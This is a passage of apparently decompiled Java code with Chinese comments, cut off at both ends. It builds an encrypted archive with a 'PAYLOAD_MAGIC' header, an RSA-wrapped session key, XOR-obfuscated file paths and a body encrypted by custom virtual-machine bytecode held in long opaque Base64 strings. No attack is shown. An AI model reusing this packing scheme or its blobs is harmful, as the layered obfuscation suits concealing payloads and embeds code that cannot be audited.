    byte[] encryptedBody = Loader.vmEncrypt(dataStream.toByteArray(), sessionKey, index);

    // 4. 构建最终的归档流 (Header + File Table + Body)
    ByteArrayOutputStream resultStream = new ByteArrayOutputStream();

    // 写入头部信息
    resultStream.write(Loader.PAYLOAD_MAGIC);
    resultStream.write(Loader.packInt(index));
    resultStream.write(Loader.packInt(encryptedKey.length));
    resultStream.write(encryptedKey);
    resultStream.write(Loader.packInt(this.fileRecords.size()));

    // 写入文件索引表 (文件名经过 XOR 混淆)
    for (int i = 0; i < this.fileRecords.size(); i++) {
      FileRecord record = this.fileRecords.get(i);
      byte[] pathBytes = record.path.getBytes(StandardCharsets.UTF_8);

      // 对路径进行 XOR 0xE9 混淆
      byte[] xoredPath = new byte[pathBytes.length];
      for (int j = 0; j < pathBytes.length; j++) {
          xoredPath[j] = (byte) (pathBytes[j] ^ 0xE9);
      }

      resultStream.write(Loader.packInt(pathBytes.length));
      resultStream.write(xoredPath);
      resultStream.write(Loader.packInt(offsets.get(i)));
    }

    // 写入加密后的正文内容
    resultStream.write(encryptedBody);

    return resultStream.toByteArray();

  } catch (Exception e) {
    // 保持原有逻辑：发生任何异常则返回空数组
    return new byte[0];
  }
}

private static byte[] encryptSessionKey(byte[] randomBytes) {
  try {
    BigInteger bigInteger0 = new BigInteger(
          "00c969bcabf11ddee4f9eb0e29eb67212c03330c7d515d9232d1f0ec310ea1ceca92c397ed1a86cabe1ad36ee65fc861136118d37d4768b65d95a1e651a0ed23af15704d56ea6455bf46d09de2654ccd723f0ec4ae5d71c5943b60841087e843ba8a858ba5582a4d748dd25dd684fccc3a09506849df7a3642fe9602227b44555133a768af72a932ceadbc858ad253e0327348362b319940c7b3a986d576474a4bb5189ab405676f348a5cc9124d19a610b90570b0837bc55dd5da5af40b8956899c9ea6c6e88859115eb26cc672d369e118ab09a051153a44ee3c48d5e8a1012a3509fcb767ce5561a337c051273659254549eb39a8438061ac088c8af90f1c35",
          16);
    BigInteger bigInteger1 = new BigInteger("010001", 16);
    return new BigInteger(1, randomBytes).modPow(bigInteger1, bigInteger0).toByteArray();
  } catch (Exception unused_ex) {
    return randomBytes;
  }
}

private static byte[] vmEncrypt(byte[] content, byte[] key, int index) {
  String vmInstructions;
  Base64.Decoder decoder;
  try {
    if (index % 2 == 0) {
      decoder = Base64.getDecoder();
      vmInstructions = "azQyMwABAAAAAQAGQGFsZ28yAAAAAAAAAAUAAAABAAAAAgAAAAEAAAACAAAAAQAAAJcAAAAOBgIAAAAFAQAAAEACAAAAAgIAAAABAQAAAAgCAAAABwEAAAAgAgAAAAkBAAAAAQIAAAAGAgAAAAwDAAAABQAAABAIYAAAAAUAAAACYAAAAAYAAAACYAAAAAcAAAABYAAAAAgAAAAFYAAAAAkAAAAHYAAAAAoAAAAHYAAAAAsAAAAHYAAAAAwAAAAHYAAAAA0AAAABYAAAAA4AAAAJYAAAAA8AAAAHYAAAABAAAAAFYAAAABEAAAABYAAAABIAAAAHYAAAABMAAAAJYAAAABQAAAACYAAAABUAAAACYAAAABYAAAACYAAAABcAAAACYAAAABgAAAAFYAAAABkAAAABYAAAABoAAAAJYAAAABsAAAACYAAAABwAAAACYAAAAB0AAAACYAAAAB4AAAABYAAAAB8AAAAGYAAAACAAAAABYAAAACEAAAABYAAAACIAAAABYAAAACMAAAABYAAAACQAAAABYAAAACUAAAABYAAAACYAAAABYAAAACcAAAABYAAAACgAAAABYAAAACkAAAABYAAAACoAAAABYAAAACsAAAACYAAAACwAAAABYAAAAC0AAAACYAAAAC4AAAABYAAAAC8AAAACYAAAADAAAAAMYAAAADEAAAACYAAAADIAAAACYAAAADMAAAAHYpAEG/IAAAAzYAAAADQAAAACAv///kFhAAAANQAAADMC///+M0AAAAA2CAAAADUT+thPAgAAADYAAAcSAAAB50AAAAA3CAAAADXgM+mMAgAAADcAAASlAAACAkAAAAA4CAAAADW0+ub9AgAAADgAAAN8AAACHUAAAAA5CAAAADWQBBvyAgAAADkAAAL1AAACOEAAAAA6CAAAADWF36bWAgAAADoAAAKkAAACU0AAAAA7CAAAADWDHbZ1AgAAADsAAAKJAAACbkAAAAA8AAAAADWDHbZ1AgAAADwAAB7lAAAMB0AAAAA9AAAAADWF36bWAgAAAD0AAA+pAAAMB0AAAAA+CAAAADWJ93SUAgAAAD4AAALaAAACv0AAAAA/AAAAADWJ93SUAgAAAD8AAA35AAAMB0AAAABAAAAAADWQBBvyAgAAAEAAAAwRAAAMB0AAAABBCAAAADWU3g82AgAAAEEAAANh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AgAAAIQAABBYAAAMB0AAAACFAAAAADVCvMoyAgAAAIUAABCrAAAMB0AAAACGAAAAADVEHLX9AgAAAIYAABBmAAAMB0AAAACHCAAAADVOuS34AgAAAIcAAArDAAAKckAAAACICAAAADVLnLZGAgAAAIgAAAqoAAAKjUAAAACJAAAAADVLnLZGAgAAAIkAAB5xAAAMB0AAAACKAAAAADVOuS34AgAAAIoAAAydAAAMB0AAAACLAAAAADVYLQFJAgAAAIsAABnlAAAMB0AAAACMCAAAADVoQLjhAgAAAIwAAAuAAAAK+UAAAACNCAAAADVlPqAoAgAAAI0AAAtlAAALFEAAAACOCAAAADVaQaZPAgAAAI4AAAtKAAALL0AAAACPAAAAADVaQaZPAgAAAI8AABA4AAAMB0AAAACQAAAAADVlPqAoAgAAAJAAABEqAAAMB0AAAACRAAAAADVoQLjhAgAAAJEAABo8AAAMB0AAAACSCAAAADVr7/LYAgAAAJIAAAvsAAALm0AAAACTCAAAADVquz1CAgAAAJMAAAvRAAALtkAAAACUAAAAADVquz1CAgAAAJQAAB3XAAAMB0AAAACVAAAAADVr7/LYAgAAAJUAABoOAAAMB0AAAACWAAAAADVtriI4AgAAAJYAABZRAAAMBwL///PzAv//4OdgAAAAlwAAAAViAAAAlwAAAClgAAAAmAAAAAViAAAAmAAAAChgAAAAmQAAAAViAAAAmQAAACdgAAAAmgAAAAViAAAAmgAAACZgAAAAmwAAAAViAAAAmwAAACVgAAAAnAAAAAViAAAAnAAAACRgAAAAnQAAAAViAAAAnQAAACNiTrkt+AAAADMC///g52AAAACeAAAABWIAAACeAAAAImAAAACfAAAABWIAAACfAAAAIWAAAACgAAAABWIAAACgAAAAIGAAAAChAAAAB2IAAAChAAAAH2AAAACiAAAABWIAAACiAAAAHmIAAAAAAAAAKmIAAAABAAAAK2Ix1oKLAAAAMwL//+DnYgAAAAIAAAAsYgAAAAMAAAAtYgAAAAQAAAAuYQAAAKMAAAArQAAAAKQCAAAAo////+9xAAAApQAAAKQT+thPE5mvfmIAAAClAAAAMwL//+DnYpTeDzYAAAAzYv///+8AAAA0Av//4OdhAAAApgAAACtiAAAApgAAAB1ix20jxgAAADMC///g52KU3g82AAAAM2EAAACnAAAAHWIAAACnAAAANAL//+DnYQAAAKgAAAA0YgAAAKgAAAAvVQAAAKkAAAAwAAAACwAAAAFi/////wAAADFiifd0lAAAADMC///g52EAAACqAAAAMWIAAACqAAAAHGIlKb6rAAAAMwL//+DnYQAAAKsAAAAvYgAAAKsAAAAbYh/AokoAAAAzAv//4OdhAAAArAAAABxhAAAArQAAABtAAAAArgQAAACsAAAArWIAAACuAAAAGmIg3iBdAAAAMwL//+DnYQAAAK8AAAAacQAAALAAAACv+QiR+0Qctf1iAAAAsAAAADMC///g52EAAACxAAAAKmIAAACxAAAAGWIl5dLrAAAAMwL//+DnYQAAALIAAAAxYQAAALMAAAAZYwAAALQAAACzAAAAAQAAALJhAAAAtQAAALRRAAAAtgAAALUAAAAFAAAABzUAAAC3AAAAtgAAEAAzAAAAuP///8MAAAC3NQAAALn////DAAAQADMAAAC6AAAAtgAAALk0AAAAuwAAALgAAAC6NQAAALwAAAC2////w1AAAAC9AAAAuwAAAAcAAAAFYgAAAL0AAAAYYgCmHxoAAAAzAv//4OdhAAAAvgAAADFjAAAAvwAAADAAAAAC/////wAAAL5hAAAAwAAAABhiAAAAwAAAAL9ihd+m1gAAADMC///g52LP1TR1AAAAMwL//+DnYQAAAMEAAAAxYgAAAMEAAAAXYv7q96sAAAAzAv//4OdhAAAAwgAAABcRAAAAw/////8AAADCEQAAAMT//////////hAAAADFAAAAwwAAAMQRAAAAxv////8AAADFEAAAAMcAAADC/////mIAAADGAAAAFmJaQaZPAAAAMwL//+DnYQAAAMgAAAAWYgAAAMgAAAAxYkBcz00AAAAzAv//4Odiifd0lAAAADMC///g52L/////AAAAMmIHRMzCAAAAMwL//+DnYjjenhcAAAAzAv//4OdhAAAAyQAAADJiAAAAyQAAABViQrzKMgAAADMC///g52EAAADKAAAALWIAAADKAAAAFGI16wLFAAAAMwL//+DnYQAAAMsAAAAVYQAAAMwAAAAUQAAAAM0EAAAAywAAAMxiAAAAzQAAABNiCLW/7QAAADMC///g52EAAADOAAAAE3EAAADPAAAAzmU+oCjgM+mMYgAAAM8AAAAzAv//4OdjAAAA0AAAADAAAAAC//////////9hAAAA0QAAANBhAAAA0gAAACliAAAA0QAAANJjAAAA0wAAADAAAAAC//////////5hAAAA1AAAANNhAAAA1QAAAChiAAAA1AAAANVhAAAA1gAAAClhAAAA1wAAANZRAAAA2AAAANcAAAAFAAAAB2EAAADZAAAAKGEAAADaAAAA2VEAAADbAAAA2gAAAAUAAAAHNQAAANwAAADYAAAQADUAAADdAAAA2wAAEAA1AAAA3hhFkOcAABAAMwAAAN8AAADcGEWQ5zMAAADgAAAA2AAAAN4zAAAA4QAAAN0YRZDnMwAAAOIAAADbAAAA3jQAAADjAAAA3wAAAOA0AAAA5AAAAOEAAADiNQAAAOUAAADjAAAA5DQAAADmAAAA3AAAAN01AAAA5wAAAOYAABAANAAAAOgYRZDnAAAA3jMAAADpAAAA5wAAAOg0AAAA6gAAAOUAAADpNAAAAOsAAADYAAAA21AAAADsAAAA6gAAAAcAAAAFYQAAAO0AAAAnYgAAAOwAAADtYQAAAO4AAAApYQAAAO8AAADuUQAAAPAAAADvAAAABQAAAAdiAAAA8AAAABJiOfFD4gAAADMC///g52EAAADxAAAAKGEAAADyAAAA8VEAAADzAAAA8gAAAAUAAAAHYQAAAPQAAAASNQAAAPUAAAD0AAAQADUAAAD2AAAA8wAAEAA1AAAA94Vpw4IAABAANAAAAPgAAAD1AAAA9jQAAAD5hWnDggAAAPc1AAAA+gAAAPgAABAAMwAAAPsAAAD6AAAA+TMAAAD8AAAA9AAAAPNQAAAA/QAAAPsAAAAHAAAABWEAAAD+AAAAJmIAAAD9AAAA/mEAAAD/AAAAJ2EAAAEAAAAA/1EAAAEBAAABAAAAAAUAAAAHYQAAAQIAAAAmYQAAAQMAAAECUQAAAQQAAAEDAAAABQAAAAc1AAABBQAAAQEAABAAMwAAAQbUqtyqAAABBTUAAAEH1KrcqgAAEAAzAAABCAAAAQEAAAEHNQAAAQkAAAEEAAAQADMAAAEKAAABCdSq3KozAAABCwAAAQQAAAEHNAAAAQwAAAEGAAABCDQAAAENAAABCgAAAQs1AAABDgAAAQwAAAENNQAAAQ8AAAEBAAABBFAAAAEQAAABDgAAAAcAAAAFYQAAAREAAAAlYgAAARAAAAERYQAAARIAAAAlYQAAARMAAAESYQAAARQAAAAkYgAAARMAAAEUYQAAARUAAAAsYgAAARUAAAARYg3PxcoAAAAzAv//4OdhAAABFgAAADJhAAABFwAAABFjAAABGAAAARcAAAABAAABFmEAAAEZAAABGFEAAAEaAAABGQAAAAUAAAAHYQAAARsAAAAkYQAAARwAAAEbUQAAAR0AAAEcAAAABQAAAAc1AAABHgAAARoAABAAMwAAAR91xavfAAABHjUAAAEgdcWr3wAAEAAzAAABIQAAARoAAAEgNQAAASIAAAEdAAAQADMAAAEjAAABInXFq98zAAABJAAAAR0AAAEgNAAAASUAAAEfAAABITQAAAEmAAABIwAAASQ1AAABJwAAASUAAAEmNQAAASgAAAEaAAABHVAAAAEpAAABJwAAAAcAAAAFYQAAASoAAAAuYQAAASsAAAAyYwAAASwAAAEqAAAAAQAAAStiAAABKQAAASxjAAABLQAAADAAAAAC//////////9hAAABLgAAAS1iAAABLgAAABBiba4iOAAAADMC///g52EAAAEvAAAAI2EAAAEwAAAAEGIAAAEwAAABL2MAAAExAAAAMAAAAAL/////////+mEAAAEyAAABMWEAAAEzAAAAImIAAAEyAAABM2EAAAE0AAAAI2EAAAE1AAABNFEAAAE2AAABNQAAAAUAAAAHNQAAATcAAAE2AAAQADMAAAE44F+1vgAAATc1AAABOeBftb4AABAAMwAAAToAAAE2AAABOTUAAAE7AAAQAAAAEAAzAAABPAAAATvgX7W+MwAAAT0AABAAAAABOTQAAAE+AAABOAAAATo0AAABPwAAATwAAAE9NQAAAUAAAAE+AAABPzUAAAFBAAABNgAAEABhAAABQgAAACJhAAABQwAAAUJRAAABRAAAAUMAAAAFAAAABzUAAAFFAAABRAAAEAA1AAABRgAAAUAAAAFFMwAAAUcAAAFGAAABQDMAAAFIAAABQAAAAURhAAABSQAAACNhAAABSgAAAUlRAAABSwAAAUoAAAAFAAAAB2EAAAFMAAAAImEAAAFNAAABTFEAAAFOAAABTQAAAAUAAAAHNQAAAU8AAAFOAAAQADMAAAFQhSU2WQAAAU81AAABUYUlNlkAABAAMwAAAVIAAAFOAAABUTUAAAFTAAAQAAAAEAAzAAABVAAAAVOFJTZZMwAAAVUAABAAAAABUTQAAAFWAAABUAAAAVI0AAABVwAAAVQAAAFVNQAAAVgAAAFWAAABVzUAAAFZAAABTgAAEAA1AAABWgAAAVgAABAANQAAAVsAAAFLAAABWjMAAAFcAAABWwAAAUszAAABXQAAAUsAAAFYNQAAAV4AAAFHAAAQADUAAAFfAAABXAAAEAA1AAABYD3O7BIAABAAMwAAAWEAAAFePc7sEjMAAAFiAAABRwAAAWAzAAABYwAAAV89zuwSMwAAAWQAAAFcAAABYDQAAAFlAAABYQAAAWI0AAABZgAAAWMAAAFkNQAAAWcAAAFlAAABZjQAAAFoAAABXgAAAV81AAABaQAAAWgAABAANAAAAWo9zuwSAAABYDMAAAFrAAABaQAAAWo0AAABbAAAAWcAAAFrNAAAAW0AAAFHAAABXFAAAAFuAAABbAAAAAcAAAAFYQAAAW8AAAAhYgAAAW4AAAFvYQAAAXAAAAAhYQAAAXEAAAFwYQAAAXIAAAAgYgAAAXEAAAFyYQAAAXMAAAAfYv////8AAAFzYlgtAUkAAAAzAv//4OdhAAABdAAAAB9hAAABdQAAAXRiAAABdQAAAA9ia+/y2AAAADMC///g52EAAAF2AAAAD0AAAAF3CAAAAXb////wYgAAAXcAAAAOYmhAuOEAAAAzAv//4OdhAAABeAAAAA5xAAABeQAAAXiSbsBs1Eclt2IAAAF5AAAAMwL//+DnYQAAAXoAAAAfYQAAAXsAAAF6EQAAAXz/////AAABexEAAAF9//////////4QAAABfgAAAXwAAAF9EQAAAX//////AAABfhAAAAGAAAABe/////5SAAABgQAAAX8AAAAHAAAAAmMAAAGCAAAAMAAAAAL/////AAABgWIAAAGCAAAADWIySwqGAAAAMwL//+DnYQAAAYMAAAANYQAAAYQAAAGDYQAAAYUAAAAeYgAAAYQAAAGFYQAAAYYAAAAfYQAAAYcAAAGGUgAAAYgAAAGHAAAABwAAAAJjAAABiQAAADAAAAAC/////wAAAYhhAAABigAAAYlRAAABiwAAAYoAAAAFAAAABzUAAAGM/////wAAEAA1AAABjQAAAYsAAAGMMwAAAY4AAAGNAAABizMAAAGPAAABi/////9iAAABjgAAAAxiGhxBHgAAADMC///g52EAAAGQAAAAHmEAAAGRAAABkFEAAAGSAAABkQAAAAUAAAAHYgAAAZIAAAALYuF6OkQAAAAzAv//4OdhAAABkwAAAAxhAAABlAAAAAs1AAABlQAAAZMAABAANQAAAZYAAAGUAAAQADUAAAGXCCxC0AAAEAAzAAABmAAAAZUILELQMwAAAZkAAAGTAAABlzMAAAGaAAABlggsQtAzAAABmwAAAZQAAAGXNAAAAZwAAAGYAAABmTQAAAGdAAABmgAAAZs1AAABngAAAZwAAAGdNAAAAZ8AAAGVAAABljUAAAGgAAABnwAAEAA0AAABoQgsQtAAAAGXMwAAAaIAAAGgAAABoTQAAAGjAAABngAAAaI0AAABpAAAAZMAAAGUUAAAAaUAAAGjAAAABwAAAAVhAAABpgAAAB9hAAABpwAAAaZSAAABqAAAAacAAAAHAAAAAmMAAAGpAAAAMAAAAAL/////AAABqGIAAAGlAAABqWK0+ub9AAAAMwL//+DnYQAAAaoAAAAfYQAAAasAAAGqYgAAAasAAAAKYseJEZAAAAAzAv//4OdhAAABrAAAAAoRAAABrQAAAaxyg7DZEAAAAa4AAAGt/////hAAAAGvAAABrnKDsNkQAAABsAAAAaz////+YgAAAa8AAAAJYvzTcoYAAAAzAv//4OdhAAABsQAAAB9hAAABsgAAAAliAAABsgAAAbFiars9QgAAADMC///g52JYLQFJAAAAMwL//+DnYQAAAbMAAAAgYQAAAbQAAAGzYgAAAbQAAAAIYrhxpKIAAAAzAv//4OdjAAABtQAAADAAAAAC//////////BiAAABtQAAAAdiPqAbEAAAADMC///g52EAAAG2AAAACGEAAAG3AAAAB2IAAAG2AAABt2L+seq0AAAAMwL//+DnYkuctkYAAAAzAv//4OdhAAABuAAAADJiAAABuAAAAAZi5pIjsAAAADMC///g52EAAAG5AAAABhAAAAG6AAABuY+zQ7YQAAABuwAAAbr////+EQAAAbwAAAG7j7NDthAAAAG9AAABuf////5iAAABvAAAAAVigx22dQAAADMC///g52EAAAG+AAAABWIAAAG+AAAAMmI1VfGTAAAAMwL//+DnYjjenhcAAAAzAv//4OcB/////wL///5B";
    } else {
      decoder = Base64.getDecoder();
      vmInstructions = "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AAAAewAAABlhAAAAfAAAAHtRAAAAfQAAAHwAAAAQAAAABzUAAAB+AAAAfQAAEAA1AAAAf/////4AABAANQAAAIAneoqZAAAQADQAAACBAAAAfgAAAH80AAAAgid6ipkAAACANQAAAIMAAACBAAAQADMAAACEAAAAgwAAAIIzAAAAhQAAAH3////+YgAAAIQAAAAOYrdThMkAAAAfAv//7tBhAAAAhgAAAA5QAAAAhwAAAIYAAAAHAAAABWEAAACIAAAAFWIAAACHAAAAiGEAAACJAAAAGWEAAACKAAAAiVEAAACLAAAAigAAABAAAAAHNQAAAIz////+AAAQADUAAACNAAAAiwAAAIwzAAAAjgAAAI0AAACLMwAAAI8AAACL/////kAAAACQAQAAAI7/////UQAAAJEAAACQAAAACQAAAAJxAAAAkgAAAJD//0v//////1AAAACTAAAAkgAAAAcAAAAQYQAAAJQAAAAUYgAAAJMAAACUYQAAAJUAAAAZYQAAAJYAAACVUQAAAJcAAACWAAAAEAAAAAcyAAAAmAAAAJf////+YgAAAJgAAAANYQAAAJkAAAAUYQAAAJoAAACZUQAAAJsAAACaAAAAEAAAAAdiAAAAmwAAAAxiyS5rPQAAAB8C///u0GEAAACcAAAADWEA